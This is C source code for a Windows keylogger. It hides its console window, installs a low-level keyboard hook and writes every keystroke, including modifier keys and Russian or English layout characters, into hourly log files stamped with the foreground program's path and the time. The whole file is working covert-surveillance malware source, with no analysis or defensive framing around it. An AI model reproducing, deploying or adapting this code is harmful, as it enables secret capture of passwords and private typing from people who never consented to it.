#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <psapi.h>
#include "vkmap.h"

typedef struct 
{
  time_t EpochTime;//holds EpochTime used in the last MetaDataStamp in the file
  HWND   WindowHandle;//holds a pointer to the window whose name was in the last metadata stamp
  DWORD  LangID;
} LastStampInfo_TypeDef;

unsigned int TrySymbolMapping(unsigned int VKcode, unsigned int* VKmapNoShift, unsigned int* VKmapWithShift);
void TryMetaDataStamp();
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);

char TargetDirName[14] = "dsfglkc89326";
char TargetFileName[24] = "sadf ghhjou65 m32i";
char TextBuffer[128] = "a[pdq,d as k[ pdgs ]jh 51df dsfdgl[37 sd";//used to temporarily store some text going to the keylog file
unsigned char SymbolsOnLine;//used to track and limit how many symbols are printed on one line in keylog file
unsigned char ModifierByte;//holds current state of modifier keys, to detect if a modifier key was newly pressed, or held down
LastStampInfo_TypeDef LastStampInfo;
FILE* FilePointer;


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HHOOK KeyboardHook;
  MSG msg;
  
  FreeConsole();//hide the console window
  TryMetaDataStamp();//write startup metadata stamp into the file
  
  //add a mark to indicate that program was started
  FilePointer = fopen( (char*) &TargetFileName, "a" );
  fprintf(FilePointer, "[PROGRAM START]");
  fclose(FilePointer);
  
  KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHookProc, 0, 0);
  
  
  while(GetMessage(&msg, 0, 0, 0))
    {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
    }
    
  
  UnhookWindowsHookEx(KeyboardHook);
  return 0;
}


//if necessary, add timestamp, current foreground window and LANGID of currently selected language into the log file
void TryMetaDataStamp()
{
  struct tm* TimePointer;
  HANDLE ProcessPointer;
  DWORD ProcessID;
  DWORD ThreadID;
  
  ThreadID = GetWindowThreadProcessId(GetForegroundWindow(), &ProcessID);//get thread and process ID's of the current foreground window
  
  //if there was a 120sec timeout or new foreground window selected or new input language selected or next hour has begun
  if(
      ((time(0) - LastStampInfo.EpochTime) > 120) || (LastStampInfo.WindowHandle != GetForegroundWindow()) ||
      (LastStampInfo.LangID != ((int) GetKeyboardLayout(ThreadID) & 0xFFFF)) || ((LastStampInfo.EpochTime % 3600) > (time(0) % 3600)) 
	)
  {
    //set and remember all the values used in this metadata stamp
    LastStampInfo.EpochTime = time(0);
    LastStampInfo.WindowHandle = GetForegroundWindow();
    LastStampInfo.LangID = (int) GetKeyboardLayout(ThreadID) & 0xFFFF;
    
    ProcessPointer = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, ProcessID);//find process info based on PID
    GetModuleFileNameExA(ProcessPointer, 0, (char*) &TextBuffer, 128);//extract process pathname into TextBuffer
    TimePointer = localtime(&LastStampInfo.EpochTime);//extract structured time from epoch time
    SymbolsOnLine = 0;//restart the symbol counter, since next symbols will be placed at the new line
    
	//update target directory and file names based on current time
	sprintf( (char*) &TargetDirName, "%04u_%02u_%02u_%02u", TimePointer->tm_year + 1900, TimePointer->tm_mon + 1, TimePointer->tm_mday, TimePointer->tm_hour );
    sprintf( (char*) &TargetFileName, "%s\\%02u-00.txt", (char*) &TargetDirName,  TimePointer->tm_hour);
	CreateDirectoryA( (char*) &TargetDirName, 0 );//make sure target directory exists
	
	//write metadata stamp into the file
    FilePointer = fopen( (char*) &TargetFileName, "a" );
    fprintf( FilePointer, "\n----------------------------------------------------------------------------------------------------\n");
    fprintf( FilePointer, "WindowName: %s\n", &TextBuffer );
    fprintf( FilePointer, "LANGID: 0x%04x   TIME: %02u:%02u:%02u\n", LastStampInfo.LangID, TimePointer->tm_hour, TimePointer->tm_min, TimePointer->tm_sec );
    fclose(FilePointer);
  }
  
  return;
}

//try to map VKcode into a UTF-8 encoded symbol (maximum width = 4 bytes)
unsigned int TrySymbolMapping(unsigned int VKcode, unsigned int* VKmapNoShift, unsigned int* VKmapWithShift)
{
  //for VKcodes from 0x30 to 0x39 (keyboard digits)
  if( (VKcode >= 0x30) && (VKcode <= 0x39) ) 
  {
    //use appropriate VKmap array depending on the state of the SHIFT keys
    if(GetKeyState(VK_SHIFT) & (1<<16)) return VKmapWithShift[VKcode - 0x30 + 0];
    else                                return VKmapNoShift[VKcode - 0x30 + 0];
  }
  
  //for VKcodes from 0x41 to 0x5A (keyboard letters)
  else if( (VKcode >= 0x41) && (VKcode <= 0x5A) ) 
  {
    //use appropriate VKmap array depending on the state of the SHIFT and CAPSLOCK keys
         if(  (GetKeyState(VK_SHIFT) & (1<<16)) &&  (GetKeyState(VK_CAPITAL) & (1<<0)) ) return VKmapNoShift[VKcode - 0x41 + 10];
    else if(  (GetKeyState(VK_SHIFT) & (1<<16)) && !(GetKeyState(VK_CAPITAL) & (1<<0)) ) return VKmapWithShift[VKcode - 0x41 + 10];
    else if( !(GetKeyState(VK_SHIFT) & (1<<16)) &&  (GetKeyState(VK_CAPITAL) & (1<<0)) ) return VKmapWithShift[VKcode - 0x41 + 10];
    else if( !(GetKeyState(VK_SHIFT) & (1<<16)) && !(GetKeyState(VK_CAPITAL) & (1<<0)) ) return VKmapNoShift[VKcode - 0x41 + 10];
  }
  
  //for VKcodes from 0x60 to 0x6F (keypad)
  else if( (VKcode >= 0x60) && (VKcode <= 0x6F) ) 
  {
    //use appropriate VKmap array depending on the state of the SHIFT and NUMLOCK keys
    if ( !(GetKeyState(VK_SHIFT) & (1<<16)) && (GetKeyState(VK_NUMLOCK) & (1<<0)) ) return VKmapNoShift[VKcode - 0x60 + 36];
    else                                                                            return VKmapWithShift[VKcode - 0x60 + 36];
  }
  
  //for VKcodes from 0xBA to 0xC0 (keyboard punctuation marks)
  else if( (VKcode >= 0xBA) && (VKcode <= 0xC0) ) 
  {
    //use appropriate VKmap array depending on the state of the SHIFT keys
    if(GetKeyState(VK_SHIFT) & (1<<16)) return VKmapWithShift[VKcode - 0xBA + 52];
    else                                return VKmapNoShift[VKcode - 0xBA + 52];
  }
  
  //for VKcodes from 0xDB to 0xDF (keyboard punctuation marks)
  else if( (VKcode >= 0xDB) && (VKcode <= 0xDF) ) 
  {
    //use appropriate VKmap array depending on the state of the SHIFT keys
    if(GetKeyState(VK_SHIFT) & (1<<16)) return VKmapWithShift[VKcode - 0xDB + 59];
    else                                return VKmapNoShift[VKcode - 0xDB + 59];
  }
  
  //return 0 if mapping was not successful
  return 0;
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) 
{ 
  unsigned int symbol = 0x00;
  KBDLLHOOKSTRUCT* KeyboardEvent = (KBDLLHOOKSTRUCT*) lParam;
  
  TryMetaDataStamp();//add a new metadata stamp if necessary
  FilePointer = fopen( (char*) &TargetFileName, "a" );
  
  if( (wParam == WM_KEYUP) || (wParam == WM_SYSKEYUP) )//if some key was released
  {
    
    //try to map VKcode into UTF-8 character, if ru-RU layout is detected, use cyrillic letters, use english letters otherwise
    if(LastStampInfo.LangID == 0x0419) symbol = TrySymbolMapping(KeyboardEvent->vkCode, (unsigned int*) &VKmapNoShift_0419, (unsigned int*) &VKmapWithShift_0419);
    else                               symbol = TrySymbolMapping(KeyboardEvent->vkCode, (unsigned int*) &VKmapNoShift_0409, (unsigned int*) &VKmapWithShift_0409);
    
    //if character was successfully mapped to ASCII-printable, write this character into the file
    if(symbol) {fprintf(FilePointer, "%.4s", (char*) &symbol); SymbolsOnLine = SymbolsOnLine + 1;}
    //if character is not ASCII-printable, write a key-specific word into the file
    else if(KeyboardEvent->vkCode == VK_SPACE)    {fprintf(FilePointer, " ");          SymbolsOnLine = SymbolsOnLine + 1;}
    else if(KeyboardEvent->vkCode == VK_RETURN)   {fprintf(FilePointer, "[ENTER]");    SymbolsOnLine = SymbolsOnLine + 7;}
    else if(KeyboardEvent->vkCode == VK_ESCAPE)   {fprintf(FilePointer, "[ESCAPE]");   SymbolsOnLine = SymbolsOnLine + 8;}
    else if(KeyboardEvent->vkCode == VK_BACK)     {fprintf(FilePointer, "[BCKSPC]");   SymbolsOnLine = SymbolsOnLine + 8;}
    else if(KeyboardEvent->vkCode == VK_TAB)      {fprintf(FilePointer, "[TAB]");      SymbolsOnLine = SymbolsOnLine + 5;}
    else if(KeyboardEvent->vkCode == VK_F1)       {fprintf(FilePointer, "[F1]");       SymbolsOnLine = SymbolsOnLine + 4;}
    else if(KeyboardEvent->vkCode == VK_F2)       {fprintf(FilePointer, "[F2]");       SymbolsOnLine = SymbolsOnLine + 4;}
    else if(KeyboardEvent->vkCode == VK_F3)       {fprintf(FilePointer, "[F3]");       SymbolsOnLine = SymbolsOnLine + 4;}
    else if(KeyboardEvent->vkCode == VK_F4)       {fprintf(FilePointer, "[F4]");       SymbolsOnLine = SymbolsOnLine + 4;}
    else if(KeyboardEvent->vkCode == VK_F5)       {fprintf(FilePointer, "[F5]");       SymbolsOnLine = SymbolsOnLine + 4;}
    else if(KeyboardEvent->vkCode == VK_F6)       {fprintf(FilePointer, "[F6]");       SymbolsOnLine = SymbolsOnLine + 4;}
    else if(KeyboardEvent->vkCode == VK_F7)       {fprintf(FilePointer, "[F7]");       SymbolsOnLine = SymbolsOnLine + 4;}
    else if(KeyboardEvent->vkCode == VK_F8)       {fprintf(FilePointer, "[F8]");       SymbolsOnLine = SymbolsOnLine + 4;}
    else if(KeyboardEvent->vkCode == VK_F9)       {fprintf(FilePointer, "[F9]");       SymbolsOnLine = SymbolsOnLine + 4;}
    else if(KeyboardEvent->vkCode == VK_F10)      {fprintf(FilePointer, "[F10]");      SymbolsOnLine = SymbolsOnLine + 5;}
    else if(KeyboardEvent->vkCode == VK_F11)      {fprintf(FilePointer, "[F11]");      SymbolsOnLine = SymbolsOnLine + 5;}
    else if(KeyboardEvent->vkCode == VK_F12)      {fprintf(FilePointer, "[F12]");      SymbolsOnLine = SymbolsOnLine + 5;}
    else if(KeyboardEvent->vkCode == VK_SNAPSHOT) {fprintf(FilePointer, "[PRTSCR]");   SymbolsOnLine = SymbolsOnLine + 8;}
    else if(KeyboardEvent->vkCode == VK_PAUSE)    {fprintf(FilePointer, "[PAUSE]");    SymbolsOnLine = SymbolsOnLine + 7;}
    else if(KeyboardEvent->vkCode == VK_INSERT)   {fprintf(FilePointer, "[INSERT]");   SymbolsOnLine = SymbolsOnLine + 8;}
    else if(KeyboardEvent->vkCode == VK_HOME)     {fprintf(FilePointer, "[HOME]");     SymbolsOnLine = SymbolsOnLine + 6;}
    else if(KeyboardEvent->vkCode == VK_PRIOR)    {fprintf(FilePointer, "[PAGEUP]");   SymbolsOnLine = SymbolsOnLine + 8;}
    else if(KeyboardEvent->vkCode == VK_DELETE)   {fprintf(FilePointer, "[DELETE]");   SymbolsOnLine = SymbolsOnLine + 8;}
    else if(KeyboardEvent->vkCode == VK_END)      {fprintf(FilePointer, "[END]");      SymbolsOnLine = SymbolsOnLine + 5;}
    else if(KeyboardEvent->vkCode == VK_NEXT)     {fprintf(FilePointer, "[PAGEDOWN]"); SymbolsOnLine = SymbolsOnLine + 10;}
    else if(KeyboardEvent->vkCode == VK_RIGHT)    {fprintf(FilePointer, "[RIGHT]");    SymbolsOnLine = SymbolsOnLine + 7;}
    else if(KeyboardEvent->vkCode == VK_LEFT)     {fprintf(FilePointer, "[LEFT]");     SymbolsOnLine = SymbolsOnLine + 6;}
    else if(KeyboardEvent->vkCode == VK_DOWN)     {fprintf(FilePointer, "[DOWN]");     SymbolsOnLine = SymbolsOnLine + 6;}
    else if(KeyboardEvent->vkCode == VK_UP)       {fprintf(FilePointer, "[UP]");       SymbolsOnLine = SymbolsOnLine + 4;}
    
    else if( (KeyboardEvent->vkCode == VK_LCONTROL) ) {fprintf(FilePointer, "[/LCTRL]");  SymbolsOnLine = SymbolsOnLine + 8; ModifierByte &= ~(1<<0);}
    else if( (KeyboardEvent->vkCode == VK_LSHIFT)   ) {fprintf(FilePointer, "[/LSHIFT]"); SymbolsOnLine = SymbolsOnLine + 9; ModifierByte &= ~(1<<1);}
    else if( (KeyboardEvent->vkCode == VK_LMENU)    ) {fprintf(FilePointer, "[/LALT]");   SymbolsOnLine = SymbolsOnLine + 7; ModifierByte &= ~(1<<2);}
    else if( (KeyboardEvent->vkCode == VK_LWIN)     ) {fprintf(FilePointer, "[/LGUI]");   SymbolsOnLine = SymbolsOnLine + 7; ModifierByte &= ~(1<<3);}
    else if( (KeyboardEvent->vkCode == VK_RCONTROL) ) {fprintf(FilePointer, "[/RCTRL]");  SymbolsOnLine = SymbolsOnLine + 8; ModifierByte &= ~(1<<4);}
    else if( (KeyboardEvent->vkCode == VK_RSHIFT)   ) {fprintf(FilePointer, "[/RSHIFT]"); SymbolsOnLine = SymbolsOnLine + 9; ModifierByte &= ~(1<<5);}
    else if( (KeyboardEvent->vkCode == VK_RMENU)    ) {fprintf(FilePointer, "[/RALT]");   SymbolsOnLine = SymbolsOnLine + 7; ModifierByte &= ~(1<<6);}
    else if( (KeyboardEvent->vkCode == VK_RWIN)     ) {fprintf(FilePointer, "[/RGUI]");   SymbolsOnLine = SymbolsOnLine + 7; ModifierByte &= ~(1<<7);}
    
    else if( (KeyboardEvent->vkCode == VK_CAPITAL) &&  (GetKeyState(VK_CAPITAL) & (1<<0)) ) {fprintf(FilePointer, "[CAPSLOCK]");    SymbolsOnLine = SymbolsOnLine + 10;}
    else if( (KeyboardEvent->vkCode == VK_SCROLL)  &&  (GetKeyState(VK_SCROLL)  & (1<<0)) ) {fprintf(FilePointer, "[SCROLLLOCK]");  SymbolsOnLine = SymbolsOnLine + 12;}
    else if( (KeyboardEvent->vkCode == VK_NUMLOCK) &&  (GetKeyState(VK_NUMLOCK) & (1<<0)) ) {fprintf(FilePointer, "[NUMLOCK]");     SymbolsOnLine = SymbolsOnLine + 9;}
    else if( (KeyboardEvent->vkCode == VK_CAPITAL) && !(GetKeyState(VK_CAPITAL) & (1<<0)) ) {fprintf(FilePointer, "[/CAPSLOCK]");   SymbolsOnLine = SymbolsOnLine + 11;}
    else if( (KeyboardEvent->vkCode == VK_SCROLL)  && !(GetKeyState(VK_SCROLL)  & (1<<0)) ) {fprintf(FilePointer, "[/SCROLLLOCK]"); SymbolsOnLine = SymbolsOnLine + 13;}
    else if( (KeyboardEvent->vkCode == VK_NUMLOCK) && !(GetKeyState(VK_NUMLOCK) & (1<<0)) ) {fprintf(FilePointer, "[/NUMLOCK]");    SymbolsOnLine = SymbolsOnLine + 10;}
  }
  
  else if( (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN) )//if some key was pressed
  {
         if( (KeyboardEvent->vkCode == VK_LCONTROL) && !(ModifierByte & (1<<0)) ) {fprintf(FilePointer, "[LCTRL]");  SymbolsOnLine = SymbolsOnLine + 7; ModifierByte |= (1<<0);}
    else if( (KeyboardEvent->vkCode == VK_LSHIFT)   && !(ModifierByte & (1<<1)) ) {fprintf(FilePointer, "[LSHIFT]"); SymbolsOnLine = SymbolsOnLine + 8; ModifierByte |= (1<<1);}
    else if( (KeyboardEvent->vkCode == VK_LMENU)    && !(ModifierByte & (1<<2)) ) {fprintf(FilePointer, "[LALT]");   SymbolsOnLine = SymbolsOnLine + 6; ModifierByte |= (1<<2);}
    else if( (KeyboardEvent->vkCode == VK_LWIN)     && !(ModifierByte & (1<<3)) ) {fprintf(FilePointer, "[LGUI]");   SymbolsOnLine = SymbolsOnLine + 6; ModifierByte |= (1<<3);}
    else if( (KeyboardEvent->vkCode == VK_RCONTROL) && !(ModifierByte & (1<<4)) ) {fprintf(FilePointer, "[RCTRL]");  SymbolsOnLine = SymbolsOnLine + 7; ModifierByte |= (1<<4);}
    else if( (KeyboardEvent->vkCode == VK_RSHIFT)   && !(ModifierByte & (1<<5)) ) {fprintf(FilePointer, "[RSHIFT]"); SymbolsOnLine = SymbolsOnLine + 8; ModifierByte |= (1<<5);}
    else if( (KeyboardEvent->vkCode == VK_RMENU)    && !(ModifierByte & (1<<6)) ) {fprintf(FilePointer, "[RALT]");   SymbolsOnLine = SymbolsOnLine + 6; ModifierByte |= (1<<6);}
    else if( (KeyboardEvent->vkCode == VK_RWIN)     && !(ModifierByte & (1<<7)) ) {fprintf(FilePointer, "[RGUI]");   SymbolsOnLine = SymbolsOnLine + 6; ModifierByte |= (1<<7);}
  }
  
  
  if(SymbolsOnLine > 99)//if there are 100 or more characters on one line
  {
    //move to the next line
    SymbolsOnLine = 0;
    fprintf(FilePointer, "\n");
  }
  
  fclose(FilePointer);
  return CallNextHookEx(0, nCode, wParam, lParam); 
} 
